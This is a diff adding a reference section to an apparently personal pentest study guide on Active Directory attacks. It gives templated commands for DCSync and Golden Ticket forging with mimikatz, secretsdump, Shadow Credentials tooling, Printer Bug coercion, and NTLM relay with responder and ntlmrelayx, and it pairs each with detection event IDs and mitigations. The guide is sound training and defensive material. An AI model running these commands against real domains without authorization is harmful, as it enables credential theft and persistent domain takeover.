@@ -63,6 +63,53 @@ secretsdump.py <domain>/<admin>:<pass>@<DC>
 
 > BloodHound is the force multiplier — it shows the *shortest path* to DA so you're not guessing. Kerberoasting + AS-REP roasting are the highest-value early wins because any domain user can attempt them. krbtgt hash = keys to the kingdom (Golden Ticket).
 
+## Key AD attacks — detail (reference)
+Commands are standard tooling; all intrusive, scope + approval. Detection Event IDs included for the report/remediation side.
+
+### DCSync (domain replication abuse)
+Impersonate a DC and pull hashes via replication — needs **Replicating Directory Changes** rights (DA or delegated). Pulling **krbtgt** enables Golden Ticket.
+```powershell
+# who has replication rights (abusable)
+Get-ObjectAcl -DistinguishedName "dc=<domain>,dc=local" -ResolveGUIDs | ? {$_.ObjectType -match 'replication'}
+# dump
+mimikatz: lsadump::dcsync /domain:<DOMAIN> /user:krbtgt
+# or impacket: secretsdump.py <domain>/<admin>:<pass>@<DC>
+```
+**Detect/mitigate:** Event ID 4662; replication rights to trusted accounts only; rotate krbtgt regularly.
+
+### Golden Ticket (persistence)
+With the **krbtgt hash**, forge TGTs for any user — survives password changes and account deletion.
+```text
+mimikatz: kerberos::golden /domain:<DOMAIN> /sid:<SID> /krbtgt:<HASH> /user:Administrator /ptt
+```
+**Detect/mitigate:** Event IDs 4769/4672; rotate krbtgt password twice; strong Kerberos policy. (Silver Ticket = same idea but forges a TGS for one service using that service account's hash.)
+
+### Shadow Credentials (Key Trust abuse)
+Write to a victim's **msDS-KeyCredentialLink** to add attacker-controlled key creds → authenticate as them without resetting their password. Needs write rights over the target (find via BloodHound).
+```text
+# tooling: Whisker (add key cred) + Rubeus (request TGT with the cert)
+# enum: Get-ADUser -Filter * -Properties msDS-KeyCredentialLink
+```
+**Detect/mitigate:** Event ID 5136 (msDS-KeyCredentialLink changes); restrict who can write it; ADCS hardening.
+
+### Printer Bug / PrintNightmare (MS-RPRN)
+Spooler RPC coerces a host to authenticate to the attacker (→ relay) or loads a malicious driver DLL as SYSTEM. Variants: CVE-2021-1675, CVE-2021-34527.
+```text
+sc qc Spooler                  # is the service running?
+# coercion: SpoolSample / printerbug.py <attacker> <victim>  → feed into NTLM relay
+```
+**Detect/mitigate:** disable Spooler where unneeded — **always on Domain Controllers**; patch.
+
+### NTLM Relay (no password needed)
+Capture NTLM auth and relay it to another service (SMB/LDAP/HTTP). Works when **signing is not enforced**.
+```bash
+responder -I <iface> -wrf              # capture / coerce auth
+ntlmrelayx.py -tf targets.txt -smb2support    # relay (add --escalate-user / -c for actions)
+```
+**Detect/mitigate:** **enable SMB signing** (blocks SMB relay); enforce LDAP signing + channel binding; reduce admin sprawl.
+
+> These five are the backbone of internal pentests: Printer Bug/NTLM relay get you from low-priv to a hash/foothold, DCSync gets krbtgt, Golden Ticket keeps it forever. Shadow Credentials is the stealthy modern takeover-a-user move.
+
 ## AD attack catalog (by phase — study/coverage index)
 The full menu. Commands for the core ones are in the attack-flow above; this is the map so I know what exists and when it applies. **CPTS focus = the post-access AD attacks** (credential dumping → privesc → lateral → persistence). Initial-access social/physical and Azure/cloud items are mostly red-team / cloud scope — know the names, but they're outside core CPTS.
 
